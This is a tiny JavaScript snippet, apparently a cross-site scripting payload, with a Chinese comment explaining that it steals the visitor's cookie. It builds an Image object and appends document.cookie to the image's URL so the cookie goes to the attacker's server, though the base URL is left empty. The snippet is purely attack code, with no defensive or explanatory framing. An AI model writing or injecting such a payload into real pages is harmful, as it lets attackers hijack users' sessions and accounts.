var img = new Image();
var baseUrl = '';
//获取用户的cookie后通过伪造获准图片资源，以携带cookie发送至攻击者服务器
img.src = baseUrl + document.cookie;
